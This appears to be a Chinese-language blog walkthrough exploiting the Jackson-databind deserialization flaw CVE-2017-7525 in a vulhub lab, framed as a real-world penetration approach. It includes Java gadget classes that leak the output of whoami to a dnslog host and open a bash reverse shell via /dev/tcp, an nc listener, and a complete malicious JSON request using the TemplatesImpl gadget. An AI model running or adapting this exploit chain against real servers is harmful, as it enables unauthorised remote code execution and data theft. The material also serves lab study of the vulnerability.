# 0x00 前言
看到的多数复现都是touch一个文件，在实战中这样并无多大意义，于是多翻了翻师傅们的文章，总结了Jackson-databind 反序列化漏洞（CVE-2017-7525）整体的一个渗透思路和过程记录，如有不对欢迎指出。

# 0x01 漏洞概述
Jackson是一款基于Java平台的开源数据处理框架，可以方便的实现 Json 对象和 Java 对象的相互转换，很多Java应用都使用Jackson框架进行Json对象处理。
Jackson-databind 是Jackson框架的核心库之一。
Jackson-databind 库在`ObjectMapper`类的`readValue`方法处理中存在一个反序列化漏洞，未授权的远程攻击者可以通过提交精心构造的恶意数据执行任意代码。

# 0x02 漏洞原理
Jackson-databind 支持 [Polymorphic Deserialization](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization) 特性（默认情况下不开启），当 json 字符串转换的 `Target class` 中有 `polymorph fields`，即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 `TemplatesImpl`，可以实现任意代码执行。


所以，本漏洞利用条件如下：
开启` JacksonPolymorphicDeserialization`，即调用以下任意方法：
```shell
objectMapper.enableDefaultTyping(); // default to using DefaultTyping.OBJECT_AND_NON_CONCRETE objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
```

   - Target class 需要有无参 `constructor`
   - Target class 中需要需要有字段类型为` Interface`、`abstract class`、`Object`，并且使用的 Gadget 需要为其子类 / 实现接口。


# 0x03 影响版本

- FasterXML Jackson-databind < 2.6.7.1
- FasterXML Jackson-databind < 2.7.9.1
- FasterXML Jackson-databind < 2.8.9



# 0x04 环境搭建
攻击机：192.168.210.156
靶机：192.168.210.206
```shell
cd /xxx/vulhub/jackson/CVE-2017-7525
docker-compose up -d
```
[vulhub](https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525)拉取的环境，漏洞环境是jackson2.8.8，内置的java环境是1.7，本文POC只能运行在目标为`JDK7u21`以下的环境中，其他情况请更换Gadget。


# 0x05 漏洞复现
## 1、访问页面
直接访问url是个spring的报错界面：
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646040348213-328df7f1-019e-4a77-a311-e4bd9606db9e.png#clientId=u42853023-2f83-4&from=paste&height=154&id=u37f7ce25&margin=%5Bobject%20Object%5D&name=image.png&originHeight=307&originWidth=915&originalType=binary&ratio=1&size=34363&status=done&style=none&taskId=u304965e2-d498-43d9-b2a0-d1419b35a76&width=457.5)
## 2、判断这个站是否使用了Jackson

   - 扫目录 -> 405响应

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646040659057-0db3e263-4654-4869-bdef-74eb63c5679d.png#clientId=u42853023-2f83-4&from=paste&height=297&id=u1af33d01&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=517&originalType=binary&ratio=1&size=62600&status=done&style=none&taskId=ue9455589-ef10-47c5-bc16-68507fff4f6&width=388)



   - 查看一下405响应的这个url，显示不支持GET，burp抓包改成POST

`[http://192.168.210.206:8080/exploit](http://192.168.210.206:8080/exploit)`

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646040728393-3da744ec-c670-4449-ba1c-f13b6747dd9e.png#clientId=u42853023-2f83-4&from=paste&height=262&id=u8de30824&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=921&originalType=binary&ratio=1&size=39259&status=done&style=none&taskId=u7297215f-cd4d-4b70-8cea-354a09b77e0&width=691)


   - 既然是POST的，加上`Content-Type: application/json`，构造畸形数据包。
      - 不添加json数据直接发送，出现`jackson`信息。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646039975567-d6546c46-46c7-4a7c-81a7-b890c7071d59.png#clientId=u42853023-2f83-4&from=paste&height=341&id=GtpB2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=455&originWidth=1144&originalType=binary&ratio=1&size=88393&status=done&style=none&taskId=uef0e6f5e-b9a4-40ca-9e03-f3b30325d4e&width=858)


      - 只加一个`{`，也出现`jackson`信息

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646039825765-2f3c52a6-982b-473b-bd5e-e1453d520c11.png#clientId=u42853023-2f83-4&from=paste&height=198&id=yVfeL&margin=%5Bobject%20Object%5D&name=image.png&originHeight=396&originWidth=970&originalType=binary&ratio=1&size=82199&status=done&style=none&taskId=u3762b33f-2078-44f7-bc94-e216157f04d&width=485)
## 3、搭建编译恶意类的环境
### （1）安装jdk1.5
下载jdk1.5的链接如下：
```shell
https://www.oracle.com/java/technologies/java-archive-javase5-downloads.html
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646041354534-ab2b4771-ff7e-460b-af97-2593c763b3ff.png#clientId=u42853023-2f83-4&from=paste&height=344&id=uf3a54c71&margin=%5Bobject%20Object%5D&name=image.png&originHeight=458&originWidth=1361&originalType=binary&ratio=1&size=75268&status=done&style=none&taskId=ucbb605da-a9b2-4295-b341-8f32e9ec99f&width=1021)


### （2）给下载的`bin`文档赋予高权限
```shell
chmod 755 jdk-1_5_0_22-linux-amd64.bin
```


### （3）执行安装jdk1.5
```bash
sudo -s ./jdk-1_5_0_22-linux-amd64.bin
```
执行完成后会在当前目录下生成一个新目录`jdk1.5.0_22`，其下的bin目录里有需要的java命令。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646041650564-0e69ef40-4c95-4999-9b78-5177d05b8e88.png#clientId=u42853023-2f83-4&from=paste&id=u3dc1733e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=38&originWidth=345&originalType=binary&ratio=1&size=7859&status=done&style=none&taskId=u2e5f0397-9721-4453-af4f-5c249a28ee0)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646042687228-ad29d9e7-15ec-4804-aa2c-d9ec6f0e28e1.png#clientId=u42853023-2f83-4&from=paste&id=uc1889599&margin=%5Bobject%20Object%5D&name=image.png&originHeight=74&originWidth=1408&originalType=binary&ratio=1&size=25415&status=done&style=none&taskId=u17196198-3ecc-4531-8c66-75d84830e9e)


## 4、漏洞验证
### （1）编译恶意类 Poc

   - Java中，类名和文件名需要一致才能正常编译。



Poc.java
```shell
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Poc extends AbstractTranslet {


    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }


    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public Poc() throws IOException {
        try {
            String[] commands = {"/bin/bash", "-c", "ping user.`whoami`.hw8zlw.dnslog.cn"};
            Process p = Runtime.getRuntime().exec(commands);
            p.waitFor();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws IOException {
        Poc helloworld = new Poc();
    }
}
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646054703244-9318e3c4-9853-476c-9096-f071a32b2880.png#clientId=u353ff384-1880-4&from=paste&height=442&id=u908cc962&margin=%5Bobject%20Object%5D&name=image.png&originHeight=589&originWidth=816&originalType=binary&ratio=1&size=97600&status=done&style=none&taskId=u9b5d3122-683e-42d5-9c70-2e6e56c4aec&width=612)

   - 使用`jdk1.5`编译成`Exploit.class`，这里直接使用绝对路径命令进行编译。
```shell
/opt/jdk1.5/jdk1.5.0_22/bin/javac Poc.java
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646055256160-a45eb3a2-087d-4328-ad0f-7ceccde76515.png#clientId=u353ff384-1880-4&from=paste&height=29&id=ufa59ae36&margin=%5Bobject%20Object%5D&name=image.png&originHeight=39&originWidth=641&originalType=binary&ratio=1&size=12251&status=done&style=none&taskId=u14edd7e0-62ae-429b-b1ee-b8444f7cad0&width=481)
### （2）将`Poc.class`进行base64编码
```shell
cat Poc.class | base64 -w 0 | xargs
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646054931453-fce7ef10-45dd-421e-ace3-6b1ee9d5ca3d.png#clientId=u353ff384-1880-4&from=paste&height=122&id=u10b381e8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=163&originWidth=575&originalType=binary&ratio=1&size=25855&status=done&style=none&taskId=ubde82304-eb20-4166-9f36-73ba15d77e0&width=431)

### （3）使用payload发送数据包，验证漏洞

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646055145359-5aad0ab2-dd79-4356-b21e-4578fa92808c.png#clientId=u353ff384-1880-4&from=paste&height=483&id=ub7b84c49&margin=%5Bobject%20Object%5D&name=image.png&originHeight=643&originWidth=1014&originalType=binary&ratio=1&size=86812&status=done&style=none&taskId=u3e7ee320-300c-465a-a0ea-2cc09809e4d&width=761)


dnslog有记录，说明漏洞存在：

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646055174245-955defeb-aee0-4e15-9077-9bb2eb4a00ae.png#clientId=u353ff384-1880-4&from=paste&height=262&id=uc92dbb55&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=758&originalType=binary&ratio=1&size=35852&status=done&style=none&taskId=u0e10baba-73eb-4102-86af-8c3692c4d79&width=569)


## 5、漏洞利用
### （1）编译恶意类 Exploit
将`Exploit.java`中的主机ip改成攻击机的，监听端口自己设置。

   - Java中，类名和文件名需要一致才能正常编译。



Exploit.java
```shell
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Exploit extends AbstractTranslet {


    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }


    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public Exploit() throws IOException {
        try {
            String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/xx.xx.xx.xx/5555 0>&1"};
            Process p = Runtime.getRuntime().exec(commands);
            p.waitFor();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws IOException {
        Exploit helloworld = new Exploit();
    }
}
```
使用`jdk1.5`编译成`Exploit.class`，这里直接使用绝对路径命令进行编译。
```shell
/opt/jdk1.5/jdk1.5.0_22/bin/javac Exploit.java
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646043050166-b44de2bc-a3b8-44a7-a428-f12a838ce6ce.png#clientId=u42853023-2f83-4&from=paste&height=70&id=uca3c15ed&margin=%5Bobject%20Object%5D&name=image.png&originHeight=93&originWidth=629&originalType=binary&ratio=1&size=23210&status=done&style=none&taskId=udfc78cb1-41f1-4b67-a940-1805532fd50&width=472)


### （2）将`Exploit.class`进行base64编码
```shell
cat Exploit.class | base64 -w 0 | xargs
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646043233400-0f6ac3db-79e2-411a-a20a-123b6cf9d230.png#clientId=u42853023-2f83-4&from=paste&height=122&id=u2749c33f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=163&originWidth=761&originalType=binary&ratio=1&size=45853&status=done&style=none&taskId=u67807837-c715-4be2-8a88-7961e8b28f4&width=571)


### （3）攻击机开启监听
```shell
nc -lvvp 5555
```


### （4）使用payload发送数据包，反弹shell
注意三点:

   - POST
   - Content-Type: application/json
   - transletBytecodes 值替换成我们 base64 后的 payload

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646049775606-d43edb81-d93a-4c6c-aedf-4f1e8ab91e4b.png#clientId=u8fb2b5d4-b11c-4&from=paste&height=493&id=ub5cc001a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=657&originWidth=1042&originalType=binary&ratio=1&size=93911&status=done&style=none&taskId=u4f535162-6209-40df-b569-3fe4b26c87c&width=782)


数据包如下：
```shell
POST /exploit HTTP/1.1
Host: 192.168.210.206:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 1866

{
  "param": [
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    {
      "transletBytecodes": [
  "yv66vgAAADEANQoADQAcBwAdEAIwoAJAAlB...zZm9ybQEApihMY29tLAAfAAgAIAATAAAABAABABcAAQAaAAAAAgAb"
      ],
      "transletName": "a.b",
      "outputProperties": {}
    }
  ]
}
```


接收到shell：

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1646039616921-6ff38c02-f46c-4b48-97fc-603a69d1cee1.png#clientId=u42853023-2f83-4&from=paste&height=252&id=ue561b109&margin=%5Bobject%20Object%5D&name=image.png&originHeight=336&originWidth=772&originalType=binary&ratio=1&size=80763&status=done&style=none&taskId=u9dbeae7f-14c0-4786-b828-d81ac431687&width=579)



---

# 0x06 参考链接

- [https://www.cnblogs.com/cute-puli/p/15378959.html](https://www.cnblogs.com/cute-puli/p/15378959.html)
- [https://www.cnblogs.com/ABKing/p/13669401.html](https://www.cnblogs.com/ABKing/p/13669401.html)
- [https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525](https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-7525)



